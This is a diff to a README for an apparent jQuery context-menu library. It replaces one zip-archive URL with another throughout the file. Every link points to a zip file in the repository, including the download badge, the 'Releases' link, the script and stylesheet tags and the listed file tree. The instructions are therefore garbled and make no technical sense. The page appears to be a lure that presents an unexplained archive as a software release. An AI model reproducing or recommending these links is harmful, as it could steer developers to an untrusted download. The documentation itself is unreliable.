@@ -6,7 +6,7 @@ Welcome to the jquery-context-menu project! This lightweight JavaScript library 
 
 ## 📥 Download Now
 
-[![Download jquery-context-menu](https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip%https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip)](https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip)
+[![Download jquery-context-menu](https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip%https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip)](https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip)
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ To use jquery-context-menu, your system should meet the following requirements:
 ## 🔍 How to Use
 
 1. **Download & Install**  
-   Visit this page to download: [jquery-context-menu Releases](https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip). Choose the latest release, and download the ZIP file. 
+   Visit this page to download: [jquery-context-menu Releases](https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip). Choose the latest release, and download the ZIP file. 
 
 2. **Extract Files**  
    Open the ZIP file and extract its contents to a folder on your computer.
@@ -35,9 +35,9 @@ To use jquery-context-menu, your system should meet the following requirements:
 3. **Include in Your Project**  
    To include jquery-context-menu in your project, add the following lines to your HTML file before the closing `</body>` tag:
    ```html
-   <link rel="stylesheet" href="https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip">
-   <script src="https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip"></script>
-   <script src="https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip"></script>
+   <link rel="stylesheet" href="https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip">
+   <script src="https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip"></script>
+   <script src="https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip"></script>
    ```
 
 4. **Create a Context Menu**  
@@ -69,9 +69,9 @@ Here’s a basic example of how to implement a right-click menu:
 <!DOCTYPE html>
 <html>
 <head>
-    <link rel="stylesheet" href="https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip">
-    <script src="https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip"></script>
-    <script src="https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip"></script>
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip">
+    <script src="https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip"></script>
+    <script src="https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip"></script>
 </head>
 <body>
     <div id="myElement">Right-click me!</div>
@@ -101,9 +101,9 @@ After downloading, you will see the following files in the extracted folder:
 
 ```
 jquery-context-menu/
-├── https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip
-├── https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip
-└── https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip
+├── https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip
+├── https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip
+└── https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip
 ```
 
 Place these files appropriately in your project.
@@ -126,4 +126,4 @@ jquery-context-menu is licensed under the MIT License. You are free to use, modi
 
 For more information, examples, and updates, visit our full documentation on GitHub.
 
-Remember, you can always download the latest version of jquery-context-menu here: [jquery-context-menu Releases](https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-context-menu-3.8.zip). Enjoy building your custom context menus!
+Remember, you can always download the latest version of jquery-context-menu here: [jquery-context-menu Releases](https://raw.githubusercontent.com/mounika1404/jquery-context-menu/main/js/jquery-menu-context-aquarellist.zip). Enjoy building your custom context menus!
